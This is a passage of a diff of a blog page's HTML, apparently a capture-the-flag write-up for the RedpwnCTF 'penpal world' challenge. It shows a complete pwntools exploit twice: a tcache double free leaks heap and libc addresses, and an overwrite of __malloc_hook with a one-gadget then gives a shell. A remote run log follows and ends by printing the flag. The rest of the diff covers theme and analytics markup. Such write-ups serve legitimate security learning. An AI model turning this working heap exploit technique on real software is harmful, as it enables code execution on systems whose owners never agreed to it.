class="string">'Which envelope #?\n'</span>, str(index))</span><br><span class="line">    <span class="comment">#r.sendlineafter()</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, content)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'4) Read a postcard\n'</span>,str(<span class="number">2</span>))</span><br><span class="line">    r.sendlineafter(<span class="string">'Which envelope #?\n'</span>, str(index))</span><br><span class="line">    r.sendafter(<span class="string">'Write.\n'</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'4) Read a postcard\n'</span>,str(<span class="number">3</span>))</span><br><span class="line">    r.sendlineafter(<span class="string">'Which envelope #?\n'</span>, str(index))</span><br><span class="line">    <span class="comment">#r.recvuntil('Command me: ')</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(index)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'4) Read a postcard\n'</span>,str(<span class="number">4</span>))</span><br><span class="line">    r.sendlineafter(<span class="string">'Which envelope #?\n'</span>, str(index))</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'new-window'</span>]</span><br><span class="line">r = getConn()</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">and</span> args.GDB:</span><br><span class="line">	debug([<span class="number">0xb11</span>,<span class="number">0x9b3</span>])<span class="comment">#0xb11,0x9b3]) #0x9b3 0xB11 0xa7c</span></span><br><span class="line"></span><br><span class="line"><span class="comment">####################################### LEAK FUCKING LIBC</span></span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">'A'</span>*<span class="number">0x30</span> + p64(<span class="number">0x0</span>)+ p64(<span class="number">0x51</span>))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>) <span class="comment"># DOUBLE FREE (no security checks while in tcache at this libc version)</span></span><br><span class="line">read(<span class="number">0</span>) <span class="comment"># LEAK HEAP</span></span><br><span class="line">heap = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))<span class="number">-0x60</span></span><br><span class="line">log.info(<span class="string">'0x%x'</span>%heap)</span><br><span class="line">log.info(<span class="string">'0x%x'</span>%(heap+<span class="number">0x100</span>))</span><br><span class="line">edit(<span class="number">0</span>,p64(heap+<span class="number">0x90</span>)) <span class="comment"># change the fd pointer to get arbitrary write with malloc</span></span><br><span class="line">add(<span class="number">0</span>) <span class="comment"># MALLOC RETURNS heap+0x60 tchachebin(0x50): heap+0x60 -&gt; heap+0x90 &lt;- 0x0</span></span><br><span class="line">add(<span class="number">1</span>) <span class="comment"># MALLOC RETURNS heap+0x90 tchachebin(0x50): heap+0x90 &lt;- 0x0</span></span><br><span class="line">add(<span class="number">0</span>) <span class="comment"># NEW ALLOCATION (NO MEMORY REUSE) THIS ONE IS DONE HERE TO PREVENT MERGE WITH TOP CHUNK</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">'B'</span>*<span class="number">0x30</span> + p64(<span class="number">0x0</span>)+ p64(<span class="number">0x51</span>))</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)) <span class="comment"># OVERWRITES THE SIZE OF CHUNK 'B'</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>) <span class="comment"># TO PREVENT FREE ERRORS WHEN FREEING AN UNSORTED BIN</span></span><br><span class="line">edit(<span class="number">1</span>,(<span class="string">'C'</span>*<span class="number">0x30</span> +p64(<span class="number">0x0</span>)+p64(<span class="number">0x51</span>)))</span><br><span class="line">add(<span class="number">1</span>) <span class="comment"># TO PREVENT FREE ERRORS WHEN FREEING AN UNSORTED BIN</span></span><br><span class="line">edit(<span class="number">1</span>, (<span class="string">'D'</span>*<span class="number">0x30</span>+p64(<span class="number">0x0</span>)+p64(<span class="number">0x51</span>)))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>): <span class="comment"># Filling tcachebin</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>) <span class="comment"># free unsortedbin</span></span><br><span class="line">read(<span class="number">0</span>) <span class="comment"># LEAK LIBC</span></span><br><span class="line">l =  u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="comment">#log.info(hex(rop.search(regs=['rdi'], order = 'regs').address))</span></span><br><span class="line">LIBC_BASE = l<span class="number">-0x3ebca0</span></span><br><span class="line">MALLOC_HOOK = LIBC_BASE+libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">FREE_HOOK = LIBC_BASE+libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">SYSTEM = LIBC_BASE+ libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">BINSH = LIBC_BASE+ libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">ONE_GADGET = LIBC_BASE+<span class="number">0x10a38c</span></span><br><span class="line">POPRDI = LIBC_BASE+<span class="number">0x2155f</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"MAIN ARENA+0x96 0x%x"</span>%l)</span><br><span class="line">log.info(<span class="string">"LIBCBASE 0x%x"</span>%LIBC_BASE)</span><br><span class="line">log.info(<span class="string">"ONEGADGET 0x%x"</span>%ONE_GADGET)</span><br><span class="line">log.info(<span class="string">"MALLOC HOOK 0x%x"</span>%MALLOC_HOOK)</span><br><span class="line">log.info(<span class="string">"FREE HOOK 0x%x"</span>%FREE_HOOK)</span><br><span class="line">log.info(<span class="string">"SYSTEM 0x%x"</span>%SYSTEM)</span><br><span class="line">log.info(<span class="string">"BIN_SH 0x%x"</span>%BINSH)</span><br><span class="line">log.info(<span class="string">"POP RDI 0x%x"</span>%POPRDI)</span><br><span class="line">log.info(<span class="string">"JUMP 0x%x"</span>%(heap+<span class="number">0x150</span>))<span class="comment">#0x1d8b6b0))</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"HEAP 0x%x"</span>%(heap)) <span class="comment">#24</span></span><br><span class="line">log.info(<span class="string">"NEXT HEAP 0x%x"</span>%(heap+<span class="number">0x130</span>))</span><br><span class="line"><span class="comment">#########################################################</span></span><br><span class="line"><span class="comment">################################### OVERWRITE MALLOC_HOOK</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(MALLOC_HOOK)) <span class="comment"># change the address of FD to MALLOC_HOOK</span></span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>) <span class="comment"># returns the address of malloc_hook</span></span><br><span class="line">edit(<span class="number">0</span>,p64(ONE_GADGET)) <span class="comment"># Overwrites content of malloc_hook to ONE_GADGET</span></span><br><span class="line">add(<span class="number">0</span>) <span class="comment"># trigers malloc hook</span></span><br><span class="line"><span class="comment">#########################################################</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></p>
+<p>The full exploit:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">host, port = <span class="string">"chall2.2019.redpwn.net"</span>, <span class="string">"4010"</span></span><br><span class="line">filename = <span class="string">"./penpal_world"</span></span><br><span class="line">elf = ELF(filename)</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#libc = ELF('/glibc/2.27/64/lib/libc.so.6')</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE:</span><br><span class="line">    libc = elf.libc<span class="comment">#ELF('/glibc/2.27/64/lib/libc-2.27.so')</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line"><span class="comment">#rop=ROP([libc])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> process(filename) <span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">else</span> remote(host, port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_PIE</span><span class="params">(proc)</span>:</span></span><br><span class="line">    memory_map = open(<span class="string">"/proc/&#123;&#125;/maps"</span>.format(proc.pid),<span class="string">"rb"</span>).readlines()</span><br><span class="line">    <span class="keyword">return</span> int(memory_map[<span class="number">0</span>].split(<span class="string">"-"</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(bp)</span>:</span></span><br><span class="line">    <span class="comment">#bp = [0xea0,0xd31,0xc52]</span></span><br><span class="line">    <span class="comment">#bp = [0x00000dfb,0x00000b7c,0x00000d10]</span></span><br><span class="line">    script = <span class="string">""</span></span><br><span class="line">    PIE = get_PIE(r)</span><br><span class="line">    PAPA = PIE</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> bp:</span><br><span class="line">        script += <span class="string">"b *0x%x\n"</span>%(PIE+x)</span><br><span class="line">    gdb.attach(r,gdbscript=script)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'4) Read a postcard\n'</span>,str(<span class="number">1</span>))</span><br><span class="line">    r.sendlineafter(<span class="string">'Which envelope #?\n'</span>, str(index))</span><br><span class="line">    <span class="comment">#r.sendlineafter()</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, content)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'4) Read a postcard\n'</span>,str(<span class="number">2</span>))</span><br><span class="line">    r.sendlineafter(<span class="string">'Which envelope #?\n'</span>, str(index))</span><br><span class="line">    r.sendafter(<span class="string">'Write.\n'</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'4) Read a postcard\n'</span>,str(<span class="number">3</span>))</span><br><span class="line">    r.sendlineafter(<span class="string">'Which envelope #?\n'</span>, str(index))</span><br><span class="line">    <span class="comment">#r.recvuntil('Command me: ')</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(index)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'4) Read a postcard\n'</span>,str(<span class="number">4</span>))</span><br><span class="line">    r.sendlineafter(<span class="string">'Which envelope #?\n'</span>, str(index))</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'new-window'</span>]</span><br><span class="line">r = getConn()</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">and</span> args.GDB:</span><br><span class="line">	debug([<span class="number">0xb11</span>,<span class="number">0x9b3</span>])<span class="comment">#0xb11,0x9b3]) #0x9b3 0xB11 0xa7c</span></span><br><span class="line"></span><br><span class="line"><span class="comment">####################################### LEAK FUCKING LIBC</span></span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">'A'</span>*<span class="number">0x30</span> + p64(<span class="number">0x0</span>)+ p64(<span class="number">0x51</span>))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>) <span class="comment"># DOUBLE FREE (no security checks while in tcache at this libc version)</span></span><br><span class="line">read(<span class="number">0</span>) <span class="comment"># LEAK HEAP</span></span><br><span class="line">heap = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))<span class="number">-0x60</span></span><br><span class="line">log.info(<span class="string">'0x%x'</span>%heap)</span><br><span class="line">log.info(<span class="string">'0x%x'</span>%(heap+<span class="number">0x100</span>))</span><br><span class="line">edit(<span class="number">0</span>,p64(heap+<span class="number">0x90</span>)) <span class="comment"># change the fd pointer to get arbitrary write with malloc</span></span><br><span class="line">add(<span class="number">0</span>) <span class="comment"># MALLOC RETURNS heap+0x60 tchachebin(0x50): heap+0x60 -&gt; heap+0x90 &lt;- 0x0</span></span><br><span class="line">add(<span class="number">1</span>) <span class="comment"># MALLOC RETURNS heap+0x90 tchachebin(0x50): heap+0x90 &lt;- 0x0</span></span><br><span class="line">add(<span class="number">0</span>) <span class="comment"># NEW ALLOCATION (NO MEMORY REUSE) THIS ONE IS DONE HERE TO PREVENT MERGE WITH TOP CHUNK</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">'B'</span>*<span class="number">0x30</span> + p64(<span class="number">0x0</span>)+ p64(<span class="number">0x51</span>))</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)) <span class="comment"># OVERWRITES THE SIZE OF CHUNK 'B'</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>) <span class="comment"># TO PREVENT FREE ERRORS WHEN FREEING AN UNSORTED BIN</span></span><br><span class="line">edit(<span class="number">1</span>,(<span class="string">'C'</span>*<span class="number">0x30</span> +p64(<span class="number">0x0</span>)+p64(<span class="number">0x51</span>)))</span><br><span class="line">add(<span class="number">1</span>) <span class="comment"># TO PREVENT FREE ERRORS WHEN FREEING AN UNSORTED BIN</span></span><br><span class="line">edit(<span class="number">1</span>, (<span class="string">'D'</span>*<span class="number">0x30</span>+p64(<span class="number">0x0</span>)+p64(<span class="number">0x51</span>)))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>): <span class="comment"># Filling tcachebin</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>) <span class="comment"># free unsortedbin</span></span><br><span class="line">read(<span class="number">0</span>) <span class="comment"># LEAK LIBC</span></span><br><span class="line">l =  u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="comment">#log.info(hex(rop.search(regs=['rdi'], order = 'regs').address))</span></span><br><span class="line">LIBC_BASE = l<span class="number">-0x3ebca0</span></span><br><span class="line">MALLOC_HOOK = LIBC_BASE+libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">FREE_HOOK = LIBC_BASE+libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">SYSTEM = LIBC_BASE+ libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">BINSH = LIBC_BASE+ libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">ONE_GADGET = LIBC_BASE+<span class="number">0x10a38c</span></span><br><span class="line">POPRDI = LIBC_BASE+<span class="number">0x2155f</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"MAIN ARENA+0x96 0x%x"</span>%l)</span><br><span class="line">log.info(<span class="string">"LIBCBASE 0x%x"</span>%LIBC_BASE)</span><br><span class="line">log.info(<span class="string">"ONEGADGET 0x%x"</span>%ONE_GADGET)</span><br><span class="line">log.info(<span class="string">"MALLOC HOOK 0x%x"</span>%MALLOC_HOOK)</span><br><span class="line">log.info(<span class="string">"FREE HOOK 0x%x"</span>%FREE_HOOK)</span><br><span class="line">log.info(<span class="string">"SYSTEM 0x%x"</span>%SYSTEM)</span><br><span class="line">log.info(<span class="string">"BIN_SH 0x%x"</span>%BINSH)</span><br><span class="line">log.info(<span class="string">"POP RDI 0x%x"</span>%POPRDI)</span><br><span class="line">log.info(<span class="string">"JUMP 0x%x"</span>%(heap+<span class="number">0x150</span>))<span class="comment">#0x1d8b6b0))</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"HEAP 0x%x"</span>%(heap)) <span class="comment">#24</span></span><br><span class="line">log.info(<span class="string">"NEXT HEAP 0x%x"</span>%(heap+<span class="number">0x130</span>))</span><br><span class="line"><span class="comment">#########################################################</span></span><br><span class="line"><span class="comment">################################### OVERWRITE MALLOC_HOOK</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(MALLOC_HOOK)) <span class="comment"># change the address of FD to MALLOC_HOOK</span></span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>) <span class="comment"># returns the address of malloc_hook</span></span><br><span class="line">edit(<span class="number">0</span>,p64(ONE_GADGET)) <span class="comment"># Overwrites content of malloc_hook to ONE_GADGET</span></span><br><span class="line">add(<span class="number">0</span>) <span class="comment"># trigers malloc hook</span></span><br><span class="line"><span class="comment">#########################################################</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 <p>Running it</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">$ root@redpwn:/ctf/work/pwn/pepal_world<span class="comment"># python penpal_world.py REMOTE</span></span><br><span class="line">[*] <span class="string">'/ctf/work/pwn/pepal_world/penpal_world'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[*] <span class="string">'/ctf/work/pwn/pepal_world/libc-2.27.so'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[+] Opening connection to chall2.2019.redpwn.net on port 4010: Done</span><br><span class="line">[*] 0x561de3031200</span><br><span class="line">[*] 0x561de3031300</span><br><span class="line">[*] MAIN ARENA+0x96 0x7f79a7fe2ca0</span><br><span class="line">[*] LIBCBASE 0x7f79a7bf7000</span><br><span class="line">[*] ONEGADGET 0x7f79a7d0138c</span><br><span class="line">[*] MALLOC HOOK 0x7f79a7fe2c30</span><br><span class="line">[*] FREE HOOK 0x7f79a7fe48e8</span><br><span class="line">[*] SYSTEM 0x7f79a7c46440</span><br><span class="line">[*] BIN_SH 0x7f79a7daae9a</span><br><span class="line">[*] POP RDI 0x7f79a7c1855f</span><br><span class="line">[*] JUMP 0x561de3031350</span><br><span class="line">[*] HEAP 0x561de3031200</span><br><span class="line">[*] NEXT HEAP 0x561de3031330</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ cat flag.txt</span><br><span class="line">flag&#123;0h_n0e5_sW1p3r_d1D_5w!peEEeE&#125;</span><br></pre></td></tr></table></figure>
 <link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>
       
     </div>
-    <footer class="article-footer">
-      <blockquote>
+    <div class="article-footer">
+      <blockquote class="mt-2x">
   <ul class="post-copyright list-unstyled">
     
-    <li class="post-copyright-link">
-      <strong>Link to this article：</strong>
+    <li class="post-copyright-link hidden-xs">
+      <strong>本文链接：</strong>
       <a href="https://teamrocketist.github.io/2019/08/17/Pwn-RedpwnCTF-penpal-world/" title="[Pwn] RedpwnCTF - penpal world" target="_blank" rel="external">https://teamrocketist.github.io/2019/08/17/Pwn-RedpwnCTF-penpal-world/</a>
     </li>
     
-    <!--li class="post-copyright-license">
+    <li class="post-copyright-license">
       <strong>版权声明： </strong> 本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！
-    </li-->
+    </li>
   </ul>
 </blockquote>
 
@@ -539,93 +595,79 @@
 </div>
 
 
-    </footer>
+    </div>
   </article>
   
     
-  <div id="comments"></div>
+  <section id="comments">
+  	
+  </section>
 
-<!-- LiveRe City install code -->
-<!--<div id="comments">
-<div id="lv-container" data-id="city" data-uid="MTAyMC8zMDExMy82NjY4">
-	<script type="text/javascript">
-   (function(d, s) {
-       var j, e = d.getElementsByTagName(s)[0];
-
-       if (typeof LivereTower === 'function') { return; }
-
-       j = d.createElement(s);
-       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
-       j.async = true;
-
-       e.parentNode.insertBefore(j, e);
-   })(document, 'script');
-	</script>
-<noscript> Please activate JavaScript for write a comment in LiveRe</noscript>
-</div>
-</div>-->
-<!-- completed City install code -->
-<div id="disqus_thread"></div>
-<script>
-
-/**
-*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
-*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
-/*
-var disqus_config = function () {
-this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
-this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
-};
-*/
-(function() { // DON'T EDIT BELOW THIS LINE
-var d = document, s = d.createElement('script');
-s.src = 'https://teamrocketist.disqus.com/embed.js';
-s.setAttribute('data-timestamp', +new Date());
-(d.head || d.body).appendChild(s);
-})();
-</script>
-<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
 
   
 </div>
 
   <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <div class="bar-inner">
   
   <ul class="pager pull-left">
     
     <li class="prev">
-      <a href="/2019/08/17/Pwn-RedpwnCTF-Black-Echo/" title="[Pwn] RedpwnCTF - Black Echo"><i class="fa fa-angle-left" aria-hidden="true"></i>&nbsp;&nbsp;Newer</a>
+      <a href="/2019/08/17/Pwn-RedpwnCTF-Black-Echo/" title="[Pwn] RedpwnCTF - Black Echo"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;Newer</span></a>
     </li>
     
     
     <li class="next">
-      <a href="/2019/07/27/Reverse-CyBRICS-CTF-Quals-2019-Hidden-Flag/" title="[Reverse] CyBRICS CTF Quals 2019 - Hidden Flag">Older&nbsp;&nbsp;<i class="fa fa-angle-right" aria-hidden="true"></i></a>
+      <a href="/2019/07/27/Reverse-CyBRICS-CTF-Quals-2019-Hidden-Flag/" title="[Reverse] CyBRICS CTF Quals 2019 - Hidden Flag"><span>Older&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
     </li>
+    
     
   </ul>
   
   
   
   <div class="bar-right">
+    
     <div class="share-component" data-sites="facebook,twitter" data-mobile-sites="facebook,twitter"></div>
+    
   </div>
-  
+  </div>
 </nav>
+  
 
-</section>
 
-  <script src="https://cdn.bootcss.com/jquery/1.12.4/jquery.min.js"></script>
+</main>
+
+  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+	
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/teamrocketist" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="https://twitter.com/teamrocketist" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    <div class="copyright">
+    	
+        &copy; 2022 TEAMROCKETIST
+        
+        <div class="publishby">
+        	Theme by <a href="https://github.com/cofess" target="_blank"> cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.
+        </div>
+    </div>
+</footer>
+  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
 <script>
 window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
 </script>
-
-<script src="/js/jquery.fancybox.min.js"></script>
-<script src="/js/plugin.js"></script>
+<script src="/js/plugin.min.js"></script>
 <script src="/js/application.js"></script>
 
-
-
-  <script>
+    <script>
 (function (window) {
     var INSIGHT_CONFIG = {
         TRANSLATION: {
@@ -646,9 +688,48 @@ window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
 
 
 
-<!-- Google Analytics -->
-<script type="text/javascript">
-(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+
+   
+
+
+
+
+   
+
+
+  <script src="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.3.5/dist/jquery.fancybox.min.js"></script>
+  <script>
+  //利用 FancyBox 实现点击图片放大
+  $(document).ready(function() {
+    $('article img').not('[hidden]').not('.panel-body img').each(function() {
+      var $image = $(this);
+      var imageCaption = $image.attr('alt');
+      var $imageWrapLink = $image.parent('a');
+      if ($imageWrapLink.length < 1) {
+        var src = this.getAttribute('src');
+        var idx = src.lastIndexOf('?');
+        if (idx != -1) {
+          src = src.substring(0, idx);
+        }
+        $imageWrapLink = $image.wrap('<a href="' + src + '"></a>').parent('a');
+      }
+      $imageWrapLink.attr('data-fancybox', 'images');
+      if (imageCaption) {
+        $imageWrapLink.attr('data-caption', imageCaption);
+      }
+    });
+    $().fancybox({
+      selector: '[data-fancybox="images"]',
+      hash: false,
+      loop: false,
+    });
+  });
+  </script>
+
+
+
+    <script defer type="text/javascript">
+(function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
 (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
 m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
 })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
@@ -657,7 +738,6 @@ ga('create', 'UA-104385070-1', 'auto');
 ga('send', 'pageview');
 
 </script>
-<!-- End Google Analytics -->
 
 
 
